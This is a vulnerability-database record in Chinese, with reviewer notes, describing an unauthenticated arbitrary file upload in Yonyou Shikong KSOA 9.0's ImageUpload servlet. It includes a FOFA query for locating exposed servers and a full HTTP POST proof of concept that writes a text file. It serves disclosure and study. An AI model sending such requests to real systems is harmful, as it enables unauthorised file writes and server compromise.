---
source: "MrWQ/vulnerability-paper"
title: "用友时空KSOA ImageUpload文件上传"
product: "用友时空KSOA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "9.0声明"
prerequisites: "无Cookie示例"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/ekboN9P-ORJETAgzvFbUyQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA%20KSOA%20ImageUpload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "语句**"
category_recommendation: "ERP / 用友 KSOA"
id: "vw-5f53736e1cbcae3565e759c7"
entity_id: "ve-5f53736e1cbcae3565e759c7"
schema_version: "1"
---

# 用友时空KSOA ImageUpload文件上传

## 条目说明

- 对象与具体问题：用友时空KSOA；ImageUpload文件上传
- 版本、配置及部署条件：9.0声明
- 认证与权限前提：无Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 迁出时空智友，和73相同接口
- HTTP头体缺空行，固定Content-Length不匹配；FOFA误取语句标题
- 文本123123上传只证写入不证控制服务器
- 完整/pictures路径可补主文，修复版未知

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ekboN9P-ORJETAgzvFbUyQ)

**漏洞简介**

用友时空 KSOA 平台 ImageUpload 处存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。  

**影响版本**

 用友时空企业信息融通平台 KSOA v9.0  

**FOFA 语句**

app="用友 - 时空 KSOA"  

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyoylbUmtMRqDHFpXPbHKgtib93GtmN1Mhrqe8bo1gHnL4MCrlGE5hsAfRdibez6vNiaEExkqYu3iaUPQ/640?wx_fmt=png)

POC:

```http
POST /servlet/com.sksoft.bill.ImageUpload?filename=123.txt&filepath=/ HTTP/1.1
Host:****
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: ****
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 8
123123

```

上传成功：![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyoylbUmtMRqDHFpXPbHKgtDnJL1kfRabVPl5icCibaVliaW2mapNic0YKHw8gBnqWpibngjp5l7xBVyIg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyoylbUmtMRqDHFpXPbHKgt50BZcz93P7WGyMJCt4gBVb1gTxvSx5vwnBN9c6qdzHgAotGNJUEVsg/640?wx_fmt=png)

验证：http://url/pictures/123.txt  

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyoylbUmtMRqDHFpXPbHKgtEAUV4pibTxvkEibiaJa4kAac9kehSeH7xLyFg3XhmfyISLnMsPTIGsw6A/640?wx_fmt=png)

**修复建议**

建议升级至安全版本  

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVwm8c9xddClZDNW2s8GsicyO1NKrSWUc4JcSvkvKSEWNB0NEcsXj0SmRHgksoOiaLfmbib3icF8g9MMVw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
